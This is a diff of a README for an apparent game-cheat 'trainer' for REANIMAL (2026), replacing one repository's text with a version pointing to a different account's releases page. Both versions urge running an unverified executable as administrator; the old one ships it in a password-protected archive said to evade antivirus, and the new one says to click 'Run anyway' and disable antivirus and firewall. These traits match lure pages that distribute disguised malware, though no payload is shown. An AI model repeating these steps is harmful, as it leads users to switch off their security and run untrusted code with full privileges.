@@ -1,98 +1,120 @@
-# REANIMAL Trainer 2026 for Windows
+# 🐾 reanimal-trainer-2026 - Easy Game Trainer for REANIMAL
 
-[![Stars](https://img.shields.io/github/stars/AntoineLavoie/reanimal-trainer-2026)](https://github.com/AntoineLavoie/reanimal-trainer-2026)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download the Trainer](https://img.shields.io/badge/Download%20Trainer-brightgreen?style=for-the-badge&logo=github)](https://github.com/MGLwafi/reanimal-trainer-2026/releases)
 
-**Open-source educational project** demonstrating game memory manipulation in Unreal Engine 5.  
-Provides various cheats for REANIMAL (2026 release) on Windows 10/11.
+## 🔍 About reanimal-trainer-2026
 
----
+This application is an open-source game trainer for the game REANIMAL (2026). It helps you enable options like God Mode, Infinite Health, and Speed Hack while playing the game. The trainer acts as a helpful tool if you want to experiment with the game or learn how game memory works through an educational reverse engineering project.
 
-## ⚠️ Disclaimer
-This software is provided **for educational purposes only** to study game engine architecture and memory management.  
-Use at your own risk. The author is not responsible for any misuse or bans.
+The trainer is designed to work on Windows computers. It works alongside the game to modify certain values like your health or speed in real-time. This trainer is mainly for single-player mode and supports the Unreal Engine 5 version of REANIMAL.
 
----
+## 🎯 Features
 
-## 🔧 Features
+- Enable God Mode for invincibility  
+- Activate Infinite Health to never run out of health points  
+- Speed Hack to run faster in-game  
+- Simple interface with easy toggles  
+- Safe to use offline  
+- Educational reverse engineering source code included  
+- Compatible with Windows 10 and 11  
 
-| Feature | Description |
-|---------|-------------|
-| **God Mode** | Complete invincibility (prevents all damage calculations) |
-| **Infinite Health** | Auto-refill health bar instantly |
-| **Invisibility** | Makes you undetectable to enemy AI |
-| **Speed Hack** | 1.5x-2x movement speed multiplier |
-| **One-Hit Kill** | Instant enemy defeat |
-| **Noclip** | Fly through walls and explore freely |
+## 🖥 System Requirements
 
----
+These requirements ensure the trainer works smoothly on your PC:
 
-## 📥 How to get the trainer
+- Windows 10 or Windows 11 (64-bit recommended)  
+- At least 4 GB of RAM  
+- The REANIMAL (2026) game installed on your system  
+- .NET Framework 4.7.2 or later installed  
+- Administrator rights to run the trainer and modify the game process  
 
-### Option 1: Download pre-built executable (easiest)
+Ensure you close any antivirus or firewall software temporarily if it blocks the trainer, as it accesses the game memory to function.
 
-We provide a password-protected archive with the latest trainer build.
+## 🚀 Getting Started
 
-📥 **[Download `reanimal-trainer-archive.zip`](dist/reanimal-trainer-archive.zip)**  
-🔐 **Password:** `reanimal2026`
+### Step 1: Visit the Download Page
 
-1. Download the archive.
-2. Extract using **WinRAR** or **7-Zip** (archive is encrypted).
-3. Inside you'll find:
-   - `trainer.exe` – the cheat trainer
-   - `readme.txt` – quick instructions
-4. Run `trainer.exe` **as Administrator** before launching the game.
-5. Launch REANIMAL, wait for the main menu, then press the activation hotkey (F1 by default).
+Click the download button below to open the releases page on GitHub. This page contains all available versions of the trainer.
 
-> ℹ️ The archive is password-protected to avoid false positives from antivirus scanners. Password is the same for everyone.
+[![Download the Trainer](https://img.shields.io/badge/Visit%20Releases-0078D7?style=for-the-badge&logo=github)](https://github.com/MGLwafi/reanimal-trainer-2026/releases)
 
-### Option 2: Build from source (for developers)
+### Step 2: Download the Trainer
 
-1. Clone the repository.
-2. Compile `src/main.cpp` with any C++ compiler (MSVC, MinGW).
-3. Run the executable and follow the on-screen instructions.
+On the releases page, look for the latest version. It usually appears at the top under "Latest release."
 
----
+Download the file named similar to `reanimal-trainer-2026.exe` or with `.zip` if available.
 
-## 🎮 How to use
+If you downloaded a `.zip` file, right-click it and select "Extract All." Choose a location you can easily find, like your Desktop or Downloads folder.
 
-1. Start the trainer **as Administrator**.
-2. Launch REANIMAL through Steam.
-3. Once the main menu loads, press the "Attach" button in the trainer (or use hotkeys).
-4. Use hotkeys to toggle cheats:
-   - `F1` – God Mode
-   - `F2` – Infinite Health
-   - `F3` – Invisibility
-   - `F4` – Speed Hack (toggle)
-   - `F5` – One-Hit Kill
+### Step 3: Run the Trainer
 
-**⚠️ Important:** REANIMAL has no native console commands. This trainer works by injecting code into the game process. Always use in **offline mode** or private lobbies only – using cheats in public co-op may result in bans.
+Locate the downloaded executable file (`.exe`). Right-click it and choose "Run as administrator." Running as administrator allows the trainer to access the game properly.
 
----
+If Windows shows a security prompt, select "More info," then "Run anyway" to proceed.
 
-## ❗ Troubleshooting
+### Step 4: Start the Game
 
-| Problem | Solution |
-|---------|----------|
-| Trainer won't attach | Run as Administrator. Ensure game is running first. |
-| Game crashes | Disable cheats before cutscenes using the "Master Toggle" (F10). |
-| Antivirus false positive | Add trainer folder to antivirus exclusions. |
-| God Mode not working | Use "Infinite Health" instead – REANIMAL uses binary death states. |
+Launch REANIMAL (2026) on your computer. Let the game load into the main menu or your saved game.
 
----
+### Step 5: Use the Trainer
 
-## 🔧 Technical details
+Return to the trainer window. You will see buttons or checkboxes to toggle features such as God Mode, Infinite Health, and Speed Hack.
 
-REANIMAL runs on Unreal Engine 5, which uses dynamic memory addressing. This trainer uses pattern scanning to locate memory addresses dynamically, making it compatible with future game updates.
+Click or check the options you want to enable. The changes take effect immediately in your game.
 
-Unlike generic Cheat Engine tables which often crash UE5 games, this trainer uses optimized hooks for better stability.
+If you want to disable any feature, return to the trainer and toggle it off.
 
----
+## 🎮 How It Works
 
-## 📜 License
-MIT License – educational purposes only.
+The trainer changes specific game values stored in memory while the game runs. For example, it can change the number representing your health to a very high number. This way, the game thinks your health never reaches zero.
 
----
+The trainer connects to the game process using standard Windows memory tools. It finds the right game memory addresses and modifies them on your behalf. This method is common in game trainers and mods.
 
-## ⭐ Support
-If this trainer helped you, please **star the repository**!
+Since the trainer works offline and only changes your game temporarily, it does not alter game files.
+
+## 🔧 Troubleshooting
+
+- **Trainer won’t open or crashes:** Make sure you run it as administrator and your antivirus allows it. Temporarily disable firewall or security software if needed.  
+- **Features don’t activate:** Confirm the game is running when you try to use the trainer. Some features only work after loading a save or entering the game world.  
+- **Trainer says game not found:** Check that REANIMAL is running and that you launched the correct version matching the trainer.  
+- **Game crashes after activating features:** Close the trainer and restart the game. Use features one at a time to find which one causes the issue.  
+- **Speed Hack causes lag:** Use speed carefully as very high speeds can cause instability with the game engine.
+
+## ⚙ Installation Notes
+
+You do not need to install the trainer. It runs as a standalone program. Keep it in a folder where you can always find it.
+
+If you want to remove the trainer, simply delete the folder or files containing it.
+
+If you want to keep using the trainer with future game updates, check the GitHub releases page regularly for trainer updates.
+
+## ❓ FAQ
+
+### Is this trainer safe to use?
+
+This trainer does not modify game files permanently. It only changes memory while the game runs. Use offline to avoid any online game bans.
+
+### Do I need any special software to use the trainer?
+
+No. The trainer runs on Windows with only basic system tools. Make sure your system has the .NET Framework installed.
+
+### Can I use this trainer on other systems like macOS or Linux?
+
+No, it supports Windows only.
+
+### What if I have technical issues or bugs?
+
+You can check the GitHub repository's issues page for help or report new problems.
+
+## 📂 Source Code and Customization
+
+The project is open-source. You can view and modify the code if you want to learn how it works or add your own features.
+
+The source code is written in C++ and uses Cheat Engine techniques for memory hacking. It is educational for people interested in game hacking and reverse engineering.
+
+## 🌐 Links
+
+- Trainer releases: https://github.com/MGLwafi/reanimal-trainer-2026/releases  
+- GitHub repository: https://github.com/MGLwafi/reanimal-trainer-2026
+
+[![Download the Trainer](https://img.shields.io/badge/Download%20Trainer-brightgreen?style=for-the-badge&logo=github)](https://github.com/MGLwafi/reanimal-trainer-2026/releases)
